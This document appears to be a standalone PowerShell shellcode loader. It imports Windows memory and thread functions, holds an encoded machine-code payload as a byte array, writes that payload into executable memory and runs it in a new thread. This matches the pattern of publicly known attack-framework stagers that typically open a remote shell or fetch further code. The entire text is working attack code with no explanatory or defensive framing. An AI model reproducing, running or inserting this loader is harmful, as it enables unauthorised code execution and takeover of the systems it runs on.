$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x2e,0x9f,0xc0,0xe4,0xdb,0xd5,0xd9,0x74,0x24,0xf4,0x5a,0x31,0xc9,0xb1,0x47,0x31,0x42,0x13,0x03,0x42,0x13,0x83,0xea,0xd2,0x7d,0x35,0x18,0xc2,0x00,0xb6,0xe1,0x12,0x65,0x3e,0x04,0x23,0xa5,0x24,0x4c,0x13,0x15,0x2e,0x00,0x9f,0xde,0x62,0xb1,0x14,0x92,0xaa,0xb6,0x9d,0x19,0x8d,0xf9,0x1e,0x31,0xed,0x98,0x9c,0x48,0x22,0x7b,0x9d,0x82,0x37,0x7a,0xda,0xff,0xba,0x2e,0xb3,0x74,0x68,0xdf,0xb0,0xc1,0xb1,0x54,0x8a,0xc4,0xb1,0x89,0x5a,0xe6,0x90,0x1f,0xd1,0xb1,0x32,0xa1,0x36,0xca,0x7a,0xb9,0x5b,0xf7,0x35,0x32,0xaf,0x83,0xc7,0x92,0xfe,0x6c,0x6b,0xdb,0xcf,0x9e,0x75,0x1b,0xf7,0x40,0x00,0x55,0x04,0xfc,0x13,0xa2,0x77,0xda,0x96,0x31,0xdf,0xa9,0x01,0x9e,0xde,0x7e,0xd7,0x55,0xec,0xcb,0x93,0x32,0xf0,0xca,0x70,0x49,0x0c,0x46,0x77,0x9e,0x85,0x1c,0x5c,0x3a,0xce,0xc7,0xfd,0x1b,0xaa,0xa6,0x02,0x7b,0x15,0x16,0xa7,0xf7,0xbb,0x43,0xda,0x55,0xd3,0xa0,0xd7,0x65,0x23,0xaf,0x60,0x15,0x11,0x70,0xdb,0xb1,0x19,0xf9,0xc5,0x46,0x5e,0xd0,0xb2,0xd9,0xa1,0xdb,0xc2,0xf0,0x65,0x8f,0x92,0x6a,0x4c,0xb0,0x78,0x6b,0x71,0x65,0x14,0x6e,0xe5,0x46,0x41,0x14,0xf8,0x2e,0x90,0xd5,0x1c,0xce,0x1d,0x33,0x70,0x40,0x4e,0xec,0x30,0x30,0x2e,0x5c,0xd8,0x5a,0xa1,0x83,0xf8,0x64,0x6b,0xac,0x92,0x8a,0xc2,0x84,0x0a,0x32,0x4f,0x5e,0xab,0xbb,0x45,0x1a,0xeb,0x30,0x6a,0xda,0xa5,0xb0,0x07,0xc8,0x51,0x31,0x52,0xb2,0xf7,0x4e,0x48,0xd9,0xf7,0xda,0x77,0x48,0xa0,0x72,0x7a,0xad,0x86,0xdc,0x85,0x98,0x9d,0xd5,0x13,0x63,0xc9,0x19,0xf4,0x63,0x09,0x4c,0x9e,0x63,0x61,0x28,0xfa,0x37,0x94,0x37,0xd7,0x2b,0x05,0xa2,0xd8,0x1d,0xfa,0x65,0xb1,0xa3,0x25,0x41,0x1e,0x5b,0x00,0x53,0x62,0x8a,0x6c,0x21,0x8a,0x0e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};